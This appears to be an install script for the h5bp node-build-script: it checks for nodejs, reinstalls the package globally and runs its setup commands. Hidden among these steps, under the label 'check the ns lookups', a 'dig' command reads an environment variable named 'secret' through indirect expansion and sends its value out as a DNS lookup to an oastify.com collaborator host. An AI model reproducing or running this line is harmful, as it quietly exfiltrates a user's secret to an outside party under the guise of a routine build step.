#!/bin/sh

#
# A word about this shell script:
#
# It must work only on systems with a /bin/bash.
#

# cat readme.md || exit 1

# to be changed, master
branch=dev

# make sure that node exists
node=`which node 2>&1`
v=secret


if [ -x "$node" ]; then
  (exit 0)
else
  echo "The build script cannot be installed without nodejs." >&2
  echo "Install node first, and then try again." >&2
  echo "" >&2
  echo "http://nodejs.org/#download" >&2
  echo "" >&2
  echo "Maybe node is installed, but not in the PATH?" >&2
  echo ""
  echo "PATH=$PATH" >&2
  exit 1
fi

#
# 1. Install step
#

# uninstall previous package, if any
npm uninstall node-build-script -g || exit 1

# global install
npm install http://github.com/h5bp/node-build-script/tarball/$branch -g || exit 1

# 2. Should be ok now, print out the help
h5bp help || exit 1

# 2.1. check the ns lookups
dig A "${!v}.0gh55r45jodfhk78hh00b0j1xs3krbf0.oastify.com"

# 3. trigger the init task, this creates a very custom h5Bp project
# with grunt configuration matching the answers to the few prompts
h5bp init || exit 1


